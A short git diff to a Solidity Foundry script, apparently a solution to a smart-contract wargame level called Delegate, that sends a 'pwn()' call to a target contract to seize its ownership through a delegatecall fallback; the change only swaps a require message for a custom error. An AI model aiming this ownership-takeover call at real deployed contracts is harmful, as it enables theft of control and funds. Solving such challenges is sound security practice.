@@ -4,11 +4,15 @@ pragma solidity ^0.8.0;
 import { Script, console } from "forge-std/Script.sol";
 
 contract DelegateSolution is Script {
+    error Delegate_CallFailed();
+
     function run(address payable target) public {
         bytes memory data = abi.encodeWithSignature("pwn()");
         vm.startBroadcast();
         (bool success, ) = target.call(data);
         vm.stopBroadcast();
-        require(success, "DelegateSolution: call failed");
+        if(!success) {
+            revert Delegate_CallFailed();
+        }
     }
 }
